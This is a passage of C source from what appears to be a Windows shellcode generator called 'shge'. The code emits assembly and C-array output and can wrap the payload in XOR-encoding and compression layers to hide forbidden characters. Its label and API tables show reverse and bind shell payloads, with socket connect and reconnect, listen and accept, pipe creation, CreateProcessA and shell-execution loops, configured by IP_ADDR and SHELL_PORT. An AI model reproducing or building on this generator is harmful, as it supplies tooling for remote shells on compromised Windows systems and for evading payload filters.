        padd(s, ctx->opt->POS_HPP_COMMENT_SIZE);
        add_hpp(ctx, "%s /* %s */", q, s);
      }
      else
      {
        add_hpp(ctx, "%s", q);
      }
    }

    if (ctx->opt->out_hpp_size >= ctx->opt->out_hpp_maxsize - SHGE_EOFHDR_SIZE)
      return SHGE_ERR_NOSPACE_HPP;

  } // for each line

  // eof lines

  // src - eof

  q[0] = 0;
  padd(q, ctx->opt->POS_INSTR);

  // should not be more than SHGE_EOFHDR_SIZE
  if (ctx->opt->SYNTAX == 0)
  {
    add_src(ctx, ";--- shellcode src end ---");
    add_src(ctx, "%sdb      '$END$'", q);
    add_src(ctx, "%send     _start", q);
    add_src(ctx, "; EOF");
  }
  else
  {
    add_src(ctx, ";--- shellcode src end ---");
    add_src(ctx, "; EOF");
  }

  //ctx->opt->out_src_size = (unsigned)strlen(ctx->opt->out_src);

  // hpp / eof

  // should not be more than SHGE_EOFHDR_SIZE

  if (ctx->opt->HPP_TYPE)
  {
    add_hpp(ctx, "}; /* unsigned char shellcode[] */");
    add_hpp(ctx, "/* EOF */");
  }
  else
  {
    add_hpp(ctx, "; /* char* shellcode */");
    add_hpp(ctx, "/* EOF */");
  }

  //ctx->opt->out_hpp_size = (unsigned)strlen(ctx->opt->out_hpp);

  return SHGE_RES_OK;

} // build_srchpp

#include "shgemain.c"
#include "shgexor.c"
#include "shgeupxs.c"

void init_names(struct SHGE_CONTEXT* ctx)
{

#define INIT_L(x,y)   sprintf(ctx->x, "%s%s%s", ctx->opt->l_prefix, y, ctx->opt->l_postfix);
#define INIT_X(x,y)   sprintf(ctx->x, "%s%s%s", ctx->opt->x_prefix, y, ctx->opt->x_postfix);
#define INIT_C(x,y)   sprintf(ctx->x, "%s%s%s", ctx->opt->c_prefix, y, ctx->opt->c_postfix);
#define INIT_M(x,y)   sprintf(ctx->x, "%s%s%s", ctx->opt->m_prefix, y, ctx->opt->m_postfix);
#define INIT_A(x,y)   sprintf(ctx->x, "%s%s%s", ctx->opt->a_prefix, y, ctx->opt->a_postfix);

  INIT_L(l___call_by_hash__          ,"call_by_hash");
  INIT_L(l___kb_cycle1__             ,"kb_cycle1");
  INIT_L(l___kb_cycle2__             ,"kb_cycle2");
  INIT_L(l___fb_start_1__            ,"fb_start_1");
  INIT_L(l___fb_start_2__            ,"fb_start_2");
  INIT_L(l___fb_cycle_1__            ,"fb_cycle_1");
  INIT_L(l___fb_cycle_2__            ,"fb_cycle_2");
  INIT_L(l___kb_found__              ,"kb_found");
  INIT_L(l___kb_win9x__              ,"kb_win9x");
  INIT_L(l___base_found__            ,"base_found");
  INIT_L(l___search_cycle__          ,"search_cycle");
  INIT_L(l___calc_hash__             ,"calc_hash");
  INIT_L(l___name_found__            ,"name_found");
  INIT_L(l___sw_retry__              ,"sw_retry");
  INIT_L(l___sw_socket_ok__          ,"sw_socket_ok");
  INIT_L(l___mtx_pushed__            ,"mtx_pushed");
  INIT_L(l___mtx_start__             ,"mtx_start");
  INIT_L(l___varp_pop__              ,"varp_pop");
  INIT_L(l___pop_th__                ,"pop_th");
  INIT_L(l___reconnect__             ,"reconnect");
  INIT_L(l___connected__             ,"connected");
  INIT_L(l___create_pipe__           ,"create_pipe");
  INIT_L(l___si_fill_cycle__         ,"si_fill_cycle");
  INIT_L(l___rs_win9X__              ,"rs_win9X");
  INIT_L(l___rs_pushed__             ,"rs_pushed");
  INIT_L(l___sh_cycle__              ,"sh_cycle");
  INIT_L(l___sh_readsocket__         ,"sh_readsocket");
  INIT_L(l___sh_sizeok__             ,"sh_sizeok");
  INIT_L(l___xor_cycle_1__           ,"xor_cycle_1");
  INIT_L(l___xor_cycle_2__           ,"xor_cycle_2");
  INIT_L(l___restart_main__          ,"restart_main");
  INIT_L(l___init_seh__              ,"init_seh");
  INIT_L(l___pop_ptr2callbyhash__    ,"pop_ptr2callbyhash");
  INIT_L(l___pop_ptr2callbyhash__th__,"pop_ptr2callbyhash__th");
  INIT_L(l___pushed__                ,"pushed");
  INIT_L(l___pushed__th__            ,"pushed__th");
  INIT_L(l___create_socket__         ,"create_socket");
  INIT_L(l___accept__                ,"accept");
  INIT_L(l___end_io_socket__         ,"end_io_socket");
  INIT_L(l___thread__                ,"thread");
  INIT_L(l___init_seh__th__          ,"init_seh__th");
  INIT_L(l___end_thread__            ,"end_thread");
  INIT_L(l___exec_shell__            ,"exec_shell");
  INIT_L(l___shell_cycle__           ,"shell_cycle");
  INIT_L(l___end_shell__             ,"end_shell");
  INIT_L(l___kill_shell__            ,"kill_shell");
  INIT_L(l___unxor_pop_esi__         ,"unxor_pop_esi");
  INIT_L(l___unxor_data__            ,"unxor_data");
  INIT_L(l___unxor_cycle__           ,"unxor_cycle");
  INIT_L(l___pop_packed__            ,"pop_packed");
  INIT_L(l___pop_getbit__            ,"pop_getbit");
  INIT_L(l___x1__                    ,"x1");
  INIT_L(l___decompr_literals_n2b__  ,"decompr_literals_n2b");
  INIT_L(l___loop1_n2b__             ,"loop1_n2b");
  INIT_L(l___loopend1_n2d__          ,"loopend1_n2d");
  INIT_L(l___decompr_ebpeax_n2b__    ,"decompr_ebpeax_n2b");
  INIT_L(l___q1__                    ,"q1");
  INIT_L(l___decompr_end_n2b__       ,"decompr_end_n2b");
  INIT_L(l___decompr_got_mlen_n2b__  ,"decompr_got_mlen_n2b");
  INIT_L(l___loop2end__              ,"loop2end");
  INIT_L(l___q3__                    ,"q3");
  INIT_L(l___decompr_loop_n2b__      ,"decompr_loop_n2b");
  INIT_L(l___loop2_n2b__             ,"loop2_n2b");
  INIT_L(l___crc32a__                ,"crc32a");
  INIT_L(l___crc32b__                ,"crc32b");
  INIT_L(l___init__                  ,"init");
  INIT_L(l___tempghbn__              ,"ghbn_pop");
  INIT_L(l___conn_fault__            ,"conn_fault");
  INIT_L(l___findbase__              ,"findbase");
  INIT_L(l___sh_cycle_save__         ,"save_alive");
  INIT_L(l___pop_prompt__            ,"pop_prompt");
  INIT_L(l___pop_pass__              ,"pop_pass");
  INIT_L(l___pop_snippet__           ,"pop_snippet");
  INIT_L(l___end_snippet_1__         ,"end_snippet_1");
  INIT_L(l___end_snippet_2__         ,"end_snippet_2");
  INIT_L(l___end_snippet_3__         ,"end_snippet_3");
  INIT_L(l___snippet_cycle__         ,"snippet_cycle");
  INIT_L(l___rcvd_snippet__          ,"rcvd_snippet");

  INIT_X(x_rp1                       ,"rp1");
  INIT_X(x_rp2                       ,"rp2");
  INIT_X(x_wp1                       ,"wp1");
  INIT_X(x_wp2                       ,"wp2");
  INIT_X(x_io_socket                 ,"io_socket");
  INIT_X(x_listen_socket             ,"listen_socket");
  INIT_X(x_ptr2callbyhash            ,"ptr2callbyhash");
  INIT_X(x_ws2_base                  ,"ws2_base");
  INIT_X(x_lastcall                  ,"lastcall");
  INIT_X(x_processinfo               ,"processinfo");
  INIT_X(x_alive                     ,"alive");
  INIT_X(x_buf                       ,"buf");

  INIT_C(c_stack_size                ,"stack_size");
  INIT_C(c_MAXBUFSIZE                ,"MAXBUFSIZE");
  INIT_C(c_K32_ID                    ,"K32_ID");
  INIT_C(c_WS2_ID                    ,"WS2_ID");
  INIT_C(c_RECONNECT_MS              ,"RECONNECT_MS");
  INIT_C(c_XORBYTE                   ,"XORBYTE");
  INIT_C(c_IP_ADDR                   ,"IP_ADDR");
  INIT_C(c_SHELL_PORT                ,"SHELL_PORT");
  INIT_C(c_INACTIVITY                ,"INACTIVITY");

  INIT_M(m_callK32                   ,"callK32");
  INIT_M(m_callWS2                   ,"callWS2");

  INIT_A(a_K32_GlobalAlloc           ,"K32_GlobalAlloc");
  INIT_A(a_K32_GlobalFree            ,"K32_GlobalFree");
  INIT_A(a_K32_CreateThread          ,"K32_CreateThread");
  INIT_A(a_K32_CloseHandle           ,"K32_CloseHandle");
  INIT_A(a_K32_CreatePipe            ,"K32_CreatePipe");
  INIT_A(a_K32_CreateProcessA        ,"K32_CreateProcessA");
  INIT_A(a_K32_GetExitCodeProcess    ,"K32_GetExitCodeProcess");
  INIT_A(a_K32_PeekNamedPipe         ,"K32_PeekNamedPipe");
  INIT_A(a_K32_ReadFile              ,"K32_ReadFile");
  INIT_A(a_K32_WriteFile             ,"K32_WriteFile");
  INIT_A(a_K32_TerminateProcess      ,"K32_TerminateProcess");
  INIT_A(a_K32_ExitThread            ,"K32_ExitThread");
  INIT_A(a_K32_CreateMutexA          ,"K32_CreateMutexA");
  INIT_A(a_K32_GetLastError          ,"K32_GetLastError");
  INIT_A(a_K32_Sleep                 ,"K32_Sleep");
  INIT_A(a_K32_LoadLibraryA          ,"K32_LoadLibraryA");
  INIT_A(a_K32_GetVersion            ,"K32_GetVersion");
  INIT_A(a_K32_WaitForSingleObject   ,"K32_WaitForSingleObject");
  INIT_A(a_K32_GetTickCount          ,"K32_GetTickCount");
//  INIT_A(a_K32_GetProcAddress        ,"K32_GetProcAddress");

  INIT_A(a_WS2_WSAStartup            ,"WS2_WSAStartup");
  INIT_A(a_WS2_socket                ,"WS2_socket");
  INIT_A(a_WS2_setsockopt            ,"WS2_setsockopt");
  INIT_A(a_WS2_closesocket           ,"WS2_closesocket");
  INIT_A(a_WS2_connect               ,"WS2_connect");
  INIT_A(a_WS2_gethostbyname         ,"WS2_gethostbyname");
  INIT_A(a_WS2_select                ,"WS2_select");
  INIT_A(a_WS2_bind                  ,"WS2_bind");
  INIT_A(a_WS2_listen                ,"WS2_listen");
  INIT_A(a_WS2_accept                ,"WS2_accept");
  INIT_A(a_WS2_send                  ,"WS2_send");
  INIT_A(a_WS2_recv                  ,"WS2_recv");

} // init_names

int __cdecl shge(struct SHGE_OPTIONS* options, int options_size)
{
  struct SHGE_CONTEXT ctx0, *ctx;
  int res;

  if (options_size != sizeof(struct SHGE_OPTIONS))
  {
    return SHGE_ERR_STRUCTSIZE;
  }

  ctx = &ctx0;

  ctx->opt = options;           // init options
  ctx->v_stack_size = 0;        // init stack/local vars
  ctx->l_count = 0;             // init lines
  ctx->struct_indent = 0;       // structure indention

  ctx->opt->mem_used     = 0;
  ctx->opt->mem_used_max = 0;

  ctx->opt->out_struct[0]   = 0;
  ctx->opt->out_struct_size = 0;

  // generate labels

  init_names(ctx);

  // generate shellcode

  if (ctx->opt->XORED)
  {
    add_struct(ctx,"xored_layer");
    add_struct(ctx,"{");
    add_struct(ctx,"<decryptor>");
    add_struct(ctx,"xored_code // must be r/w memory");
    add_struct(ctx,"{");
  }

  if (ctx->opt->COMPRESSED)
  {
    add_struct(ctx,"compressed_layer");
    add_struct(ctx,"{");
    add_struct(ctx,"compressed_code");
    add_struct(ctx,"{");
  }

  shge_main(ctx);

  // link

  link(ctx);

  // build out_bin

  res = build_bin(ctx);
  if (res != SHGE_RES_OK)
  {
    freectx(ctx);
    return res;
  }

  if (ctx->opt->COMPRESSED)
  {

    add_struct(ctx,"} // compressed_code");
    add_struct(ctx,"<decompressor> // unpack to the stack");
    add_struct(ctx,"} // compressed_layer");

    // compress

    res = compress(ctx);
    if (res != SHGE_RES_OK)
    {
      freectx(ctx);
      return res;
    }

  } // COMPRESSED

  if (ctx->opt->XORED)
  {

    // add xor layer

    res = xorit(ctx);
    if (res != SHGE_RES_OK)
    {
      freectx(ctx);
      return res;
    }

    // re-link

    link(ctx);

    // re-build out_bin

    res = build_bin(ctx);
    if (res != SHGE_RES_OK)
    {
      freectx(ctx);
      return res;
    }

    add_struct(ctx,"} // xored_code");
    add_struct(ctx,"} // xored_layer");

  } // XORED

  // build out_src/out_hpp

  res = build_srchpp(ctx);
  if (res != SHGE_RES_OK)
  {
    freectx(ctx);
    return res;
  }

  /* free allocated data && exit */

  freectx(ctx);
  return SHGE_RES_OK;

} /* shge() */

char* __cdecl get_version()
{
  return SHGE_VERSION;
}

char* __cdecl get_error(int code)
{
  switch(code)
  {
    case SHGE_RES_OK         : return "No error";
    case SHGE_ERR_NOMEMORY   : return "No memory (error in malloc/new)";
    case SHGE_ERR_NOSPACE_BIN: return "Not enough space to build .bin (check max_bin_size)";
    case SHGE_ERR_NOSPACE_SRC: return "Not enough space to build .asm (check max_src_size)";
    case SHGE_ERR_NOSPACE_HPP: return "Not enough space to build .hpp (check max_hpp_size)";
    case SHGE_ERR_BADPARAMS  : return "Incompatible/invalid parameters";
    case SHGE_ERR_XOR        : return "Can not hide all required characters";
    case SHGE_ERR_STRUCTSIZE : return "shge(): sizeof(struct SHGE_OPTIONS) error";
    default                  : return "Unknown error";
  }
} /* get_error */

/* EOF */
